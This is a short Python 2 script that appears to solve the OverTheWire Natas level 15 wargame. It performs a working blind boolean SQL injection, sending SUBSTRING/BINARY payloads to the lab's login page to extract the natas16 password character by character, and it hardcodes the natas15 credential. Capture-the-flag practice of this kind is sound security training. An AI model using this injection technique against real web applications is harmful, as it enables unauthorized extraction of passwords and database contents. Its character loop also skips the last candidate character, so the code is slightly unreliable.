#! /usr/bin/python

import requests
import re

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

c = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
natas16pw = ''
debug = 1

for local in range(1, 33) :
	found = False
	if debug == 1 :
		print 'local : ' + str(local) + ', char :',
	for x in range(0, len(c)-1) :
		payload = '?username=natas16" AND SUBSTRING(password,' + str(local) + ',1)=BINARY "' + c[x]
		r = requests.get('http://natas15.natas.labs.overthewire.org/index.php' + payload, auth=(username, password))
		if debug == 1 :
			print c[x],
		if 'exists' in r.text :
			natas16pw += c[x]
			if debug == 1 :
				print '\nFound : ' + natas16pw
			found = True
		if found == True :
			break

print natas16pw
